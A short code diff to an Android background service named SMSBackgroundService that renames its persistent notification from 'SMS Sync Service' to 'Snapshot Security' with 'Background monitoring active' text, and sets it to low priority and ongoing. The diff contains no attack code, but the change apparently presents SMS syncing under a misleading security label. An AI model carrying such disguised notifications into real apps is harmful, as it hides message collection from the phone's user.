@@ -113,9 +113,12 @@ public class SMSBackgroundService extends Service {
         }
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("SMS Sync Service")
-                .setContentText("Syncing SMS in the background")
+                .setContentTitle("Snapshot Security")
+                .setContentText("Background monitoring active")
                 .setSmallIcon(R.drawable.ic_sms)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .setOngoing(true)
                 .build();
 
         startForeground(1, notification);
